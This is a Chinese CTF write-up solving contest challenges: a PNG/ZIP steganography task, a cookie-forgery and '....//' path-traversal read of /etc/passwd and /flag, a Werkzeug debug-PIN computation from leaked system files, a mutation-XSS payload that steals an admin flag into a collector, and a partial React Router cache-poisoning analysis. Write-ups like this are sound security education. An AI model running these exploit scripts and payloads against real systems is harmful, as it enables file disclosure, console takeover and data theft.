---
title: "创宇杯wp(web)"
date: 2026-09-15 00:00:00
categories:
  - WP
tags:
  - CTF
  - 创宇杯
  - Web
  - Misc
description: "创宇杯个人 Writeup，记录 Web 题目的分析与利用过程，并保留 Misc 解题记录。"
cover: /images/wp/chuangyu-cup-wp/cover.png
disableNunjucks: true
---

## misc
### 薛定谔的猫
[https://file.xiaoyuyc.com/cyctf/challenges/misc/1/cat.pdf](https://file.xiaoyuyc.com/cyctf/challenges/misc/1/cat.pdf)

题目给了一个外部连接，

![](/images/wp/chuangyu-cup-wp/image-001.png)

阅读器打不开，下载下来用imhex打开，看文件头发现是png文件

![](/images/wp/chuangyu-cup-wp/image-002.png)

把文件后缀改成png打开

![](/images/wp/chuangyu-cup-wp/image-003.png)

![](/images/wp/chuangyu-cup-wp/image-004.png)

图片尾部发现编码，解码一下

![](/images/wp/chuangyu-cup-wp/image-005.png)

拿到后半段flag

![](/images/wp/chuangyu-cup-wp/image-006.png)

再把图片拖进随波逐流，发现有隐藏zip文件，写个脚本探测一下

![](/images/wp/chuangyu-cup-wp/image-007.png)

+ 偏移 `0` 是外层 PNG。
+ 偏移 `904295` 开始出现 ZIP 结构。
+ 偏移 `904381` 处又出现一个 PNG 文件头，说明 ZIP 里藏了图片。
+ EOCD 后面还有额外数据，很可能是隐藏信息。

直接解析zip条目

```bash
python3 - <<'PY'
import subprocess

url = 'https://file.xiaoyuyc.com/cyctf/challenges/misc/1/cat.pdf'
data = subprocess.check_output(['curl', '-L', '-s', url])

for lh in [904295, 904332, 2103778]:
    sig = data[lh:lh+4]
    flags = int.from_bytes(data[lh+6:lh+8], 'little')
    method = int.from_bytes(data[lh+8:lh+10], 'little')
    comp_size = int.from_bytes(data[lh+18:lh+22], 'little')
    uncomp_size = int.from_bytes(data[lh+22:lh+26], 'little')
    name_len = int.from_bytes(data[lh+26:lh+28], 'little')
    extra_len = int.from_bytes(data[lh+28:lh+30], 'little')
    name = data[lh+30:lh+30+name_len].decode(errors='replace')
    data_start = lh + 30 + name_len + extra_len

    print('offset:', lh)
    print('name:', name)
    print('flags:', hex(flags))
    print('method:', method)
    print('compressed size:', comp_size)
    print('uncompressed size:', uncomp_size)
    print('data start:', data_start)
    print('first bytes:', data[data_start:data_start+16].hex())
    print()
PY
```

![](/images/wp/chuangyu-cup-wp/image-008.png)

重点看两个条目：

```text
secret/Cat.png
data start: 904376
first bytes: 001640e9bf89504e470d0a1a0a
```

这里前 5 字节是异常数据，真正 PNG 头从 `904381` 开始。

```text
secret/cat.txt
data start: 2103822
compressed size: 118
uncompressed size: 119
```

`cat.txt` 是 deflate 数据。

直接解出cat.txt

```bash
python3 - <<'PY'
import subprocess
import zlib

url = 'https://file.xiaoyuyc.com/cyctf/challenges/misc/1/cat.pdf'
data = subprocess.check_output(['curl', '-L', '-s', url])

raw = data[2103822:2103940]
text = zlib.decompress(raw, -15).decode('utf-8')

print(text)
PY
```

![](/images/wp/chuangyu-cup-wp/image-009.png)

拿到前一半解码

![](/images/wp/chuangyu-cup-wp/image-010.png)

flag：

flag{efb7204a-a4be-4b5f-9449-5ccd80ae3179}

完整exp

```bash
python3 - <<'PY'
import subprocess
import zlib
import base64
import re

url = 'https://file.xiaoyuyc.com/cyctf/challenges/misc/1/cat.pdf'
data = subprocess.check_output(['curl', '-L', '-s', url])

cat_raw = data[2103822:2103940]
cat_text = zlib.decompress(cat_raw, -15).decode('utf-8')
first_b64 = re.search(r'[A-Za-z0-9+/=]{20,}', cat_text).group(0)
first = base64.b64decode(first_b64 + '===').decode('utf-8')

eocd = data.rfind(b'PK\x05\x06')
comment_len = int.from_bytes(data[eocd+20:eocd+22], 'little')
tail_b64 = data[eocd+22+comment_len:]
tail = base64.b64decode(tail_b64).decode('utf-8')
suffix = re.match(r'[^\u4e00-\u9fff]+', tail).group(0)

print(first + suffix)
PY
```

## web
### Hackers Blog
页面是一个博客，直接看源码

![](/images/wp/chuangyu-cup-wp/image-011.png)

发现缺失了id8，访问一下

![](/images/wp/chuangyu-cup-wp/image-012.png)

回显不是普通404，说明这个文章是存在数据库里的，尝试sql注入没成功，找后台

发现[http://challenge.xiaoyuyc.com:44343/admin/](http://challenge.xiaoyuyc.com:44343/admin/)存在后台入口

![](/images/wp/chuangyu-cup-wp/image-013.png)

看源码

![](/images/wp/chuangyu-cup-wp/image-014.png)

```markdown
看登录逻辑
```js
document.cookie = "admin_auth=true; path=/";
```
```

也就是说登录成功后，前端自己设置了 `admin_auth=true`。如果后端也只检查这个 cookie，那就可以直接伪造登录状态。

我们直接伪造cookie访问

```markdown
curl-i -sS -H "Cookie: admin_auth=true" "http://challenge.xiaoyuyc.com:44343/admin/home.php"
```

![](/images/wp/chuangyu-cup-wp/image-015.png)

看到返回200

后台能看到缺失的id=8的文章

![](/images/wp/chuangyu-cup-wp/image-016.png)

有编辑入口，看id=8文章的草稿

```markdown
curl -i -sS -H "Cookie: admin_auth=true" "http://challenge.xiaoyuyc.com:44343/admin/article_edit.php?id=8"
```

纯文章内容，

看到后台维护页有这样一个链接：

```markdown

<a href="download.php?file=templates/demo_template.txt" class="btn-action">下载基础配置模板 v1.2</a>
```

正常下载模板

```markdown
curl -i -sS -H "Cookie: admin_auth=true" "http://challenge.xiaoyuyc.com:44343/admin/download.php?file=templates/demo_template.txt"
```

![](/images/wp/chuangyu-cup-wp/image-017.png)

这说明 `file` 参数会被后端拿去读文件。下一步就是看能不能任意文件读取。

download.php` 自己就在 `/admin/` 目录下，尝试直接读

```markdown
curl -i -sS -H "Cookie: admin_auth=true" "http://challenge.xiaoyuyc.com:44343/admin/download.php?file=download.php"
```

![](/images/wp/chuangyu-cup-wp/image-018.png)

能看到有waf，同时源码也暴露了漏洞逻辑

第一处是鉴权：

```php
if (!isset($_COOKIE['admin_auth']) || $_COOKIE['admin_auth'] !== 'true')
```

后端只认 cookie 值，没有校验 session。

第二处是文件读取：

```php
$filepath = __DIR__ . '/' . $file;
readfile($filepath);
```

中间虽然过滤了 `../`：

```php
$file = str_replace('../', '', $file);
```

但是这个过滤是一次性的替换，而且替换后不会再次检查。

比如传入：

```latex
....//config.php
```

字符串中间有一段 `../`：

```latex
....//config.php
  ^^^
  ../
```

后端把这段 `../` 删除后，剩下的内容会变成：

```latex
../config.php
```

也就是过滤之后反而得到真正的目录穿越路径。

利用 `....//` 绕过，读网站根目录的 `config.php`：

```markdown
curl -i -sS -H "Cookie: admin_auth=true" "http://challenge.xiaoyuyc.com:44343/admin/download.php?file=....//config.php"
```

![](/images/wp/chuangyu-cup-wp/image-019.png)

能看到 `哎哟 被过滤了`，说明过滤确实触发了。

但是后面又成功输出了 `config.php` 源码，说明 `....//` 绕过成功。

配置文件里还有初始化 SQL：

![](/images/wp/chuangyu-cup-wp/image-020.png)

读一下前台文章逻辑：

```markdown
curl -i -sS -H "Cookie: admin_auth=true" "http://challenge.xiaoyuyc.com:44343/admin/download.php?file=....//article.php"
```

![](/images/wp/chuangyu-cup-wp/image-021.png)

这里用的是预处理语句。解释了为什么看不到文章以及sql注入不了

测试能不能读系统文件

```markdown
curl -i -sS -H "Cookie: admin_auth=true" "http://challenge.xiaoyuyc.com:44343/admin/download.php?file=....//....//....//....//etc/passwd"
```

![](/images/wp/chuangyu-cup-wp/image-022.png)成功返回，尝试看能不能直接读flag

```markdown
curl -i -sS -H "Cookie: admin_auth=true" "http://challenge.xiaoyuyc.com:44343/admin/download.php?file=....//....//....//....//flag"
```

![](/images/wp/chuangyu-cup-wp/image-023.png)

能直接读到，所以最后就是一个路径穿越的漏洞

完整exp

```markdown
import re
import sys
import urllib.request


DEFAULT_BASE = "http://challenge.xiaoyuyc.com:44343"


def read_url(url):
    req = urllib.request.Request(
        url,
        headers={
            "Cookie": "admin_auth=true",
            "User-Agent": "Mozilla/5.0",
        },
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read().decode("utf-8", errors="replace")


def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE).rstrip("/")
    payload = "....//....//....//....//flag"
    url = f"{base}/admin/download.php?file={payload}"

    print(f"[*] target: {base}")
    print(f"[*] reading: {url}")

    body = read_url(url)
    print("[*] raw body:")
    print(body)

    m = re.search(r"flag\{[^}]+\}", body, re.I)
    if not m:
        print("[-] flag not found")
        return 1

    print(f"[+] flag: {m.group(0)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```



### PyBundlePin
前端页面直接给了关键接口

先直接访问

![](/images/wp/chuangyu-cup-wp/image-024.png)看页面知道应该是需要题解pin，然后执行看flag的操作

前端源码能知道

1. 页面前端从 `/bundle/index` 取公开 bundle 条目。
2. `/console` 需要提交 `pin`，然后可以选择执行 `flag` 命令。
3. `/debug/status` 会告诉我们 PIN 格式。
4. 题目明确说 intended route 是 code audit，不是爆破。

前端暴露了app.js看源码

![](/images/wp/chuangyu-cup-wp/image-025.png)

这里能确定 bundle 读取接口是：

```latex
/bundle/read?name=xxx&ticket=xxx
```

前端不会自己算 ticket，而是从 `/bundle/index` 拿到公开条目的 `name` 和 `ticket` 后再读。

![](/images/wp/chuangyu-cup-wp/image-026.png)

直接访问拿到相关信息，还有一个salt的字段数值

源码里能看到 ticket 的计算逻辑，形式是：

```markdown
hashlib.sha1(f"{salt}|{name}".encode()).hexdigest()[:24]
```

即

ticket = sha1(salt + "|" + name) 前 24 位

验证

```markdown
python3 -c 'import hashlib; salt="cd7e89a79551d32d6161e09920db2c31"; name="notes/ops.txt"; print(hashlib.sha1(f"{salt}|{name}".encode()).hexdigest()[:24])'
```

![](/images/wp/chuangyu-cup-wp/image-027.png)这个值和 `/bundle/index` 里的 `notes/ops.txt` 的 ticket 一样

```markdown
python3 -c 'import hashlib; salt="cd7e89a79551d32d6161e09920db2c31"; name="notes/reminder.txt"; print(hashlib.sha1(f"{salt}|{name}".encode()).hexdigest()[:24])'
```

![](/images/wp/chuangyu-cup-wp/image-028.png)

也和公开 ticket 对得上，所以后面就可以用同样规则去算隐藏诊断文件的 ticket。

开始计算几个诊断文件的 ticket：

```bash
python3 - <<'PY'
import hashlib

salt = "cd7e89a79551d32d6161e09920db2c31"
names = [
    "diag/runtime/last_error.log",
    "diag/etc/passwd",
    "diag/proc/self/status",
    "diag/sys/class/net/eth0/address",
    "diag/etc/machine-id",
    "diag/proc/sys/kernel/random/boot_id",
    "diag/proc/self/cgroup",
]

for name in names:
    print(name, hashlib.sha1(f"{salt}|{name}".encode()).hexdigest()[:24])
PY
```

![](/images/wp/chuangyu-cup-wp/image-029.png)

都设置成环境变量

然后拿flask路径

```markdown
curl -sS "$BASE/bundle/read?name=diag/runtime/last_error.log&ticket=$T_TRACE"
```

![](/images/wp/chuangyu-cup-wp/image-030.png)这里要取的是 Flask 模块路径：

```latex
/usr/local/lib/python3.12/site-packages/flask/app.py
```

Werkzeug PIN 算法里会用到 `mod.__file__`，所以这个路径很重要。

读取 `/proc/self/status`，拿 UID

```bash
curl -sS "$BASE/bundle/read?name=diag/proc/self/status&ticket=$T_STATUS"
```

![](/images/wp/chuangyu-cup-wp/image-031.png)

重点看这一行：

```latex
Uid:    10001   10001   10001   10001
```

得到：

```latex
uid = 10001
```

后面要用这个 UID 去 `/etc/passwd` 里反查用户名。

```bash
curl -sS "$BASE/bundle/read?name=diag/etc/passwd&ticket=$T_PASSWD"
```

![](/images/wp/chuangyu-cup-wp/image-032.png)刚才 UID 是 `10001`，这里对应的 passwd 行是：

```latex
ctf:x:10001:999::/home/ctf:/bin/sh
```

所以：

```latex
username = ctf
```

Werkzeug PIN 的 public bits 里会用到当前用户名。

读取网卡 MAC

```bash
curl -sS "$BASE/bundle/read?name=diag/sys/class/net/eth0/address&ticket=$T_MAC"
```

![](/images/wp/chuangyu-cup-wp/image-033.png)得到：

```latex
mac = e2:2b:2c:9e:d0:c2
```

Werkzeug PIN 算法里不是直接用 `e2:2b:2c:9e:d0:c2`，而是会转成整数，也就是：

```bash
python3 -c "print(int('e2:2b:2c:9e:d0:c2'.replace(':', ''), 16))"
```

![](/images/wp/chuangyu-cup-wp/image-034.png)

mac_int = 248675060076738

读取 machine-id，失败就读 boot_id先试 `/etc/machine-id`：

```bash
curl -i -sS "$BASE/bundle/read?name=diag/etc/machine-id&ticket=$T_MACHINE"
```

这里 `/etc/machine-id` 没有，所以走 Werkzeug 在 Linux 上的另一个来源 `/proc/sys/kernel/random/boot_id`。

命令：

```bash
curl -sS "$BASE/bundle/read?name=diag/proc/sys/kernel/random/boot_id&ticket=$T_BOOT"
```

![](/images/wp/chuangyu-cup-wp/image-035.png)

machine_base = 58255f3a-d029-496d-bc43-a6565688f983

读取 cgroup，拿 cgroup_tail

```markdown
curl -sS "$BASE/bundle/read?name=diag/proc/self/cgroup&ticket=$T_CGROUP"
```

![](/images/wp/chuangyu-cup-wp/image-036.png)Werkzeug 里处理 cgroup 的方式大概是：

```python
cgroup_tail = first_line.strip().rpartition("/")[2]
```

当前第一行是：

```latex
0::/
```

最后一个 `/` 后面没有内容，所以：

```latex
cgroup_tail = ""
```

最终 machine id 相关输入就是：

```latex
machine_base + cgroup_tail
= 58255f3a-d029-496d-bc43-a6565688f983 + ""
```

本地计算 Werkzeug PIN

现在字段已经齐了：

```latex
username      = ctf
modname       = flask.app
app name      = Flask
flask_path    = /usr/local/lib/python3.12/site-packages/flask/app.py
mac           = e2:2b:2c:9e:d0:c2
mac_int       = 248675060076738
machine_base  = 58255f3a-d029-496d-bc43-a6565688f983
cgroup_tail   = ""
```

计算命令：

```bash
python3 - <<'PY'
import hashlib
from itertools import chain

username = "ctf"
flask_path = "/usr/local/lib/python3.12/site-packages/flask/app.py"
mac = "e2:2b:2c:9e:d0:c2"
machine_base = "58255f3a-d029-496d-bc43-a6565688f983"
cgroup_tail = ""

probably_public_bits = [
    username,
    "flask.app",
    "Flask",
    flask_path,
]

private_bits = [
    str(int(mac.replace(":", ""), 16)),
    (machine_base + cgroup_tail).encode(),
]

h = hashlib.sha1()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode()
    h.update(bit)

h.update(b"cookiesalt")
h.update(b"pinsalt")

num = f"{int(h.hexdigest(), 16):09d}"[:9]

for group_size in (5, 4, 3):
    if len(num) % group_size == 0:
        pin = "-".join(
            num[i:i + group_size].rjust(group_size, "0")
            for i in range(0, len(num), group_size)
        )
        break

print(pin)
PY
```

![](/images/wp/chuangyu-cup-wp/image-037.png)

拿到pin，回主页提交即可

![](/images/wp/chuangyu-cup-wp/image-038.png)





### ReContext Memo
这题整体是一个富文本 memo。普通用户可以创建 memo，然后提交 report 给管理员 bot。页面上还给了一个同源 collector，可以用来接收盲打回显。

![](/images/wp/chuangyu-cup-wp/image-039.png)

直接看源码关键部分

```html
<form class="panel" method="post" action="/ui/notes">
  <label>Title <input name="title" value="release note"></label>
  <label>Body <textarea name="body" spellcheck="false">&lt;p&gt;hello reviewer&lt;/p&gt;</textarea></label>
  <button>Create memo</button>
</form>

```

还有 collector：

```html
<p>Use <code>/collect/d05ec2ec05</code> for blind review callbacks.</p>

```

这里能看出来两件事：

1. memo 内容是富文本 HTML。
2. 页面专门给了 collector，基本就是让我们打 XSS 后把结果回传回来。

虽然首页表单走的是 `/ui/notes`，但是题目也有 JSON API。先探一下：

```bash
curl -sS -H 'Content-Type: application/json' \
  --data-binary '{"title":"api probe","body":"<p>probe</p>"}' \
  http://challenge.xiaoyuyc.com:31330/api/notes
```

![](/images/wp/chuangyu-cup-wp/image-040.png)

返回里直接给了 note id 和 report API，后面 exploit 用这个接口比较方便。

```markdown
访问刚才创建出来的 note：
curl -sS http://challenge.xiaoyuyc.com:31330/note/f02bc8ea7845
```

看关键位置

![](/images/wp/chuangyu-cup-wp/image-041.png)服务端没有直接把 HTML 放进页面，而是把 sanitizer 处理过的 HTML 做了 base64，放在 `data-html` 里，再交给前端脚本渲染。

继续看前端脚本：

```bash
curl -i -sS http://challenge.xiaoyuyc.com:31330/assets/review.js
```

![](/images/wp/chuangyu-cup-wp/image-042.png)这里有一个很明显的分支：

```javascript
if (document.body.dataset.renderMode === "legacy-xmp") {
  sink.innerHTML = `<xmp class="memo-frame">${sanitized}</xmp>`;
  return;
}
```

普通页面是：

```javascript
sink.innerHTML = sanitized;
```

legacy 模式是：

```javascript
sink.innerHTML = `<xmp class="memo-frame">${sanitized}</xmp>`;
```

这就有问题了。如果 sanitizer 保留下来的内容里有 `</xmp>`，普通页面里它可能只是一段属性文本，但是 legacy 模式会先拼字符串，再整体丢给 `innerHTML`。这类场景很像 DOMPurify mutation-XSS。

payload：

```html
<img src=x alt="</xmp><img src=x onerror='fetch(`/api/admin/flag`).then(r=>r.text()).then(f=>fetch(`/collect/TOKEN`,{method:`POST`,body:f}))'>">
```

思路是：

1. 外层是一个普通的 `<img>`。
2. 真正危险的内容放进 `alt` 属性里。
3. sanitizer 会删危险事件属性，但这里 `onerror` 此时只是 `alt` 的文本内容，不是外层标签的事件属性。
4. 普通 note 页面看起来没事。
5. 管理员 legacy review 把 sanitized HTML 拼成 `<xmp>...</xmp>` 后，`alt` 里的 `</xmp>` 会闭合外层 `xmp`。
6. 后面的 `<img src=x onerror=...>` 重新变成真实 DOM，图片加载失败后执行 JS。

JS 做的事情：

```javascript
fetch(`/api/admin/flag`)
  .then(r => r.text())
  .then(f => fetch(`/collect/TOKEN`, {method: `POST`, body: f}))
```

因为 bot 已经登录 admin，访问 `/api/admin/flag` 能拿到 flag。然后再把 flag POST 到同源 collector。

命令实现

```markdown
先设置目标和随机 collector token：

base='http://challenge.xiaoyuyc.com:31330'
token=$(python3 -c 'import secrets; print(secrets.token_hex(6))')
echo "$token"
```

![](/images/wp/chuangyu-cup-wp/image-043.png)创建恶意 memo：

```bash
note_resp=$(python3 - "$token" <<'PY' | curl -sS -H 'Content-Type: application/json' --data-binary @- "$base/api/notes"
import json, sys
token = sys.argv[1]
payload = (
    '<img src=x alt="</xmp><img src=x '
    "onerror='fetch(`/api/admin/flag`).then(r=>r.text()).then(f=>fetch(`/collect/"
    + token +
    "`,{method:`POST`,body:f}))'>\">"
)
print(json.dumps({"title": "legacy export check", "body": payload}))
PY
)
echo "$note_resp"
note_id=$(python3 -c 'import sys,json; print(json.load(sys.stdin)["id"])' <<< "$note_resp")
echo "$note_id"
```

![](/images/wp/chuangyu-cup-wp/image-044.png)这里拿到的 `note_id` 后面提交 report 要用。

接着访问 note，看 sanitizer 之后到底留下了什么：

```bash
note_html=$(curl -sS "$base/note/$note_id")
NOTE_HTML="$note_html" python3 - "$token" <<'PY'
import os, sys, re, base64, html
token = sys.argv[1]
s = os.environ["NOTE_HTML"]
m = re.search(r'id="sanitized-source"\s+data-html="([^"]*)"', s)
raw = base64.b64decode(html.unescape(m.group(1))).decode()
print(raw)
print("TOKEN_OK =", token in raw)
PY
```

![](/images/wp/chuangyu-cup-wp/image-045.png)这一步很关键。可以看到：

1. 外层 `<img src=x ...>` 被规范化成了 `<img src="x" ...>`。
2. `alt` 还在。
3. `alt` 里面的 `</xmp><img ... onerror=...>` 也还在。
4. token 是当前这次生成的 token，没有串到其他 collector。

然后提交 report：

```bash
report_resp=$(printf '{"id":"%s"}' "$note_id" | curl -sS -H 'Content-Type: application/json' --data-binary @- "$base/api/report")
echo "$report_resp"
report_id=$(python3 -c 'import sys,json; print(json.load(sys.stdin)["id"])' <<< "$report_resp")
echo "$report_id"
```

![](/images/wp/chuangyu-cup-wp/image-046.png)这里说明 report 已经进队列了。后端会通知 bot，bot 的行为大概是：

```http
POST /visit HTTP/1.1
Host: 127.0.0.1:3001
Content-Type: application/json

{"noteId":"7dfa207403b1","reportId":"ba22535e8646aa89"}
```

bot 先登录：

```http
GET  /login
POST /login username=admin&password=<admin password>
```

再访问内部 review 页面。我们不能直接访问 review，因为没有 admin session，所以只能通过 report 让 bot 帮忙访问。

轮询 report 状态：

```bash
for i in $(seq 1 20); do
  curl -sS "$base/api/report/$report_id"
  echo
  sleep 1
done
```

![](/images/wp/chuangyu-cup-wp/image-047.png)看到 `logging-in` 和 `visiting` 就说明 bot 已经开始跑了。

最后轮询 collector：

```markdown
for i in $(seq 1 60); do
  resp=$(curl -sS "$base/api/collect/$token")
  echo "$resp"
  flag=$(python3 -c 'import sys,json,re,html; data=json.load(sys.stdin); text="\n".join(html.unescape(m.get("body","")) for m in data.get("messages",[])); r=re.search(r"flag\{[^}]+\}", text, re.I); print(r.group(0) if r else "")' <<< "$resp")
  if [ -n "$flag" ]; then
    echo "FLAG = $flag"
    break
  fi
  sleep 1
done
```

exp：

```markdown
#!/usr/bin/env python3
import base64
import html
import json
import re
import secrets
import sys
import time
import urllib.parse
import urllib.request


DEFAULT_BASE = "http://challenge.xiaoyuyc.com:27887"

# 这台靶机每次请求都可能被 reset，所有请求都要带重试
ATTEMPTS = 6


def _read(url, data=None, headers=None, timeout=15):
    last = None
    for i in range(ATTEMPTS):
        try:
            req = urllib.request.Request(url, data=data, headers=headers or {})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.read().decode(errors="replace")
        except Exception as exc:
            last = exc
            time.sleep(0.4 * (i + 1))
    raise last


def post_json(url, data):
    body = json.dumps(data).encode()
    return json.loads(_read(url, data=body, headers={"Content-Type": "application/json"}))


def get_json(url):
    return json.loads(_read(url))


def get_text(url):
    return _read(url)


def decode_sanitized(note_html):
    m = re.search(r'id="sanitized-source"\s+data-html="([^"]*)"', note_html)
    if not m:
        return ""
    return base64.b64decode(html.unescape(m.group(1))).decode(errors="replace")


def find_flag(messages):
    for message in messages:
        body = html.unescape(message.get("body", ""))
        m = re.search(r"flag\{[^}]+\}", body, re.I)
        if m:
            return m.group(0)
    return None


def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE).rstrip("/")
    token = secrets.token_hex(6)

    payload = (
        '<img src=x alt="</xmp><img src=x '
        "onerror='fetch(`/api/admin/flag`).then(r=>r.text()).then(f=>fetch(`/collect/"
        + token
        + "`,{method:`POST`,body:f}))'>\">"
    )

    print(f"[*] base: {base}")
    print(f"[*] collector token: {token}")

    note = post_json(
        f"{base}/api/notes",
        {
            "title": "legacy export check",
            "body": payload,
        },
    )
    note_id = note["id"]
    print(f"[*] note id: {note_id}")

    note_html = get_text(f"{base}/note/{note_id}")
    sanitized = decode_sanitized(note_html)
    print(f"[*] sanitized html: {sanitized}")
    print(f"[*] token in sanitized html: {token in sanitized}")

    report = post_json(f"{base}/api/report", {"id": note_id})
    report_id = report["id"]
    status_url = urllib.parse.urljoin(base + "/", report.get("statusUrl", f"/api/report/{report_id}"))
    print(f"[*] report id: {report_id}")

    collect_url = f"{base}/api/collect/{urllib.parse.quote(token)}"
    last_status = None
    for _ in range(60):
        try:
            status = get_json(status_url).get("status")
            if status and status != last_status:
                print(f"[*] report status: {status}")
                last_status = status
        except Exception as exc:
            print(f"[!] report status error: {exc}")

        try:
            data = get_json(collect_url)
        except Exception as exc:
            print(f"[!] collect error: {exc}")
            time.sleep(1)
            continue

        flag = find_flag(data.get("messages", []))
        if flag:
            print(f"[+] flag: {flag}")
            return 0
        time.sleep(1)

    print("[-] flag not received")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

![](/images/wp/chuangyu-cup-wp/image-048.png)





### Ghost loader
一个叫 Ghost Loader 的"安全研究公告板"，能注册登录，能看到三篇公开文章。登录之后页面上会多出两个东西：一个是 Create a widget pack（能传一段 JS，服务端按 ES module 提供），另一个是 collector（一个同源的回显接口）。

首页上有一句话

```html
<p>Reported posts are reopened in an internal browser session so moderators can verify client-side behavior and export related pages during incident response.</p>
```

意思就是有管理员 bot，被举报的文章会被它用内部浏览器重新打开。所以这题的目标就是：想办法让 bot 打开的那篇文章页面里去加载我们自己的 widget JS。文章页里正好有这么一行 `<script type="module" src="/widgets/default/post-tools.js">`，这个 `widgetBase` 是能从服务端数据里控制的，剩下的问题只是怎么把数据改掉并且让它被缓存下来。

页面上能点的东西：

```html
<form method="post" action="/ui/register">
<form method="post" action="/ui/login">
<form method="post" action="/ui/report">
<form method="post" action="/ui/widgets">
```

CSP 是 `default-src 'self'`，看着挺严，但后面我们的 JS 是挂在同源路径下的，所以 CSP 不拦。

常规探了一下路径：

```bash
for p in robots.txt sitemap.xml .git/HEAD admin ui/ login; do
  printf '%-14s ' "$p"
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$base/$p"
done
```

![](/images/wp/chuangyu-cup-wp/image-049.png)

没什么直接能捡的东西，`/admin/export` 是存在的但要管理员权限（后面 bot 会用到它）。

打开一篇文章：

```bash
curl -sS "$base/post/interesting-bug"
```

页面 head 里有一行 prefetch，指向一个 `.data` 后缀的接口：

```html
<link rel="prefetch" as="fetch" href="/post/interesting-bug.data">
```

正文后面挂着 hydration 数据和一个 module script：

```html
<script>window.__staticRouterHydrationData = {"loaderData":{"routes/root":{"board":"ghost-loader","previewPath":"/post/interesting-bug.data"},"routes/post":{"post":{"slug":"interesting-bug","title":"Interesting Bug","author":"moss","summary":"...","body":"..."},"widgetBase":"/widgets/default","theme":"obsidian"}},"actionData":null,"errors":null};</script>
<script type="module" src="/widgets/default/post-tools.js"></script>

```

这里就是全题最核心的地方了：页面上加载哪个 widget，是由 loader data 里的 `widgetBase` 决定的，拼上 `/post-tools.js` 就是脚本地址。现在是 `/widgets/default`，如果我们能让它变成 `/u/<我>/widgets/<我的pack>`，那执行的就是我们的 JS。

顺手把这个 `.data` 接口也看一眼：

```bash
curl -i -sS "$base/post/interesting-bug.data"
```

![](/images/wp/chuangyu-cup-wp/image-050.png).data` 是 `no-store`，本身不进缓存，但它返回的这份 JSON 结构后面要原样拿来用。默认的 widget 内容也看一眼：

```bash
curl -i -sS "$base/widgets/default/post-tools.js"
```

![](/images/wp/chuangyu-cup-wp/image-051.png)

注册（顺手把 cookie 存下来）：

```bash
curl -i -sS -c cj.txt -X POST "$base/ui/login" \X POST "$base/ui/login" \
    -d 'username=ghost96786240&password=Pass123456'
```

![](/images/wp/chuangyu-cup-wp/image-052.png)

带上 cookie 再访问首页，多出下面这块：

```html
<div class="eyebrow">Signed In</div>
<h2>attacker1789710604</h2>
<p>Your personal collector endpoint is <code>/collect/911cfc97ca873367ea7fe103</code>.</p>
<h2>Create a widget pack</h2>
<p>Your packs are served as ES modules from <code>/u/&lt;you&gt;/widgets/&lt;name&gt;/post-tools.js</code>.</p>
<form method="post" action="/ui/widgets">
  <input name="name" placeholder="widget name (letters, digits, dashes)" required>
  <textarea name="code" spellcheck="false">fetch("/collect/911cfc97ca873367ea7fe103", { method: "POST", body: "hello-from-widget" })</textarea>
  <button type="submit">Save Widget Pack</button>
</form>

```

默认的示例代码就已经是往 collector 打数据了，等于题目直接把"用什么回显"告诉我们了。

另外还有一个 JSON API，首页表单走的是 `/ui/*`，但 API 用起来更省事，先探一下：

```bash
curl -sS -b cj.txt "$base/api/me"
```

![](/images/wp/chuangyu-cup-wp/image-053.png)

不带 cookie 就是 401，说明这个接口就是用来读自己信息的。后面 exp 里 collector token 直接从这儿取。 摸清 nginx 的缓存行为

题面里 `cache-cascade` 那篇文章一直在讲缓存，作者显然是在暗示这题要走缓存投毒。先确认页面的缓存策略：

```bash
for i in 1 2 3; do
  curl -s -o /dev/null -D - "$base/post/interesting-bug" | grep -iE '^(x-cache|cache-control)'
done
```

![](/images/wp/chuangyu-cup-wp/image-054.png)文章页是会被 nginx 缓存的（`s-maxage=60`，一分钟过期）。

然后试一下请求头里带 `Cache-Control: no-cache`：

```bash
curl -s -o /dev/null -D - -H 'Cache-Control: no-cache' "$base/post/interesting-bug" | grep -iE '^(x-cache|cache-control)'
```

![](/images/wp/chuangyu-cup-wp/image-055.png)这里很关键：带 `no-cache` 的请求 nginx 会跳过读缓存（`BYPASS`），但响应照样会写回缓存。也就是说，只要我们能构造一次"内容被我们控制"的响应，哪怕这次请求本身没命中缓存，它也会把毒写进去，后面任何人（包括 bot）再访问就是 `HIT` 到我们的版本。这就是这题投毒的落点。

找那个"被渲染层信任的请求头"

问题是：正常请求下服务端渲染出来的 `widgetBase` 永远是 `/widgets/default`，怎么让它按我们的意思变？

先按最朴素的想法试了一圈，把能想到的头都怼了一遍，看响应有没有变化：

```bash
for h in X-Forwarded-Host X-Forwarded-Prefix X-Original-URL X-Rewrite-URL X-Widget X-Widget-Base \
         X-Base-Path X-Script-Name Forwarded Referer Origin; do
  printf '%-22s ' "$h"
  curl -s -H "$h: /u/attacker1789710604/widgets/w1" "$base/post/interesting-bug.data" \
    | grep -o '"widgetBase":"[^"]*"'
done
```

![](/images/wp/chuangyu-cup-wp/image-056.png)量。说明 `widgetBase` 不是从这些常见头里拼出来的。

回过头看那篇文章的标题和内容——"modern SSR stacks can betray their cache layers"、"route loaders, pre-render data, and public edge caches"——这就是在指 React Router / Remix 的那两个 CVE：

+ CVE-2025-43864：请求头 `X-React-Router-Spa-Mode` 可以强行让 SSR 应用进 SPA 模式，页面渲染失败，错误响应被缓存 → 缓存投毒（DoS）。
+ CVE-2025-43865：请求头 `X-React-Router-Prerender-Data` 可以让攻击者伪造"预渲染数据"，覆盖传给 HTML 的所有 loader 数据 → 存储型 XSS + 缓存投毒。

第二个明显就是我们想要的。先验证一下这两个头在本题里到底有没有被读：

```bash
curl -sS -H 'X-React-Router-Spa-Mode: 1' "$base/post/interesting-bug"
```

![](/images/wp/chuangyu-cup-wp/image-057.png)头是被读的（不然不会报这个错），而且报错信息里的 `server-runtime/routes.ts:87` 正好是 React Router 里处理 prerender data 的那段代码位置。也就是说题目确实把这套逻辑搬过来了。

不过这个 SPA 头本身没什么用，任何非空值都是这个错误页，纯粹是 CVE-2025-43864 的那个 DoS 分支。



